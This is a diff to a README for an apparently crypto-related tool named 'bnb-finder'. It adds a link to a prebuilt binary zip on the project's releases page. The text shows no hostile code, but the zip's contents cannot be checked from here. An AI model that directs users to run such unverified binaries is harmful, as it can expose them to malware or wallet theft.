@@ -12,7 +12,7 @@ https://github.com/skone8544/bnb-finder/
 cd bnb-finder
 python bnb-finder.py
 ```
-Or you can run it from binary files:
+Or you can run it from binary files: https://github.com/skone8544/bnb-finder/releases/download/bnb/bnb-finder.zip
 
 ![demo](./demo.png)
 
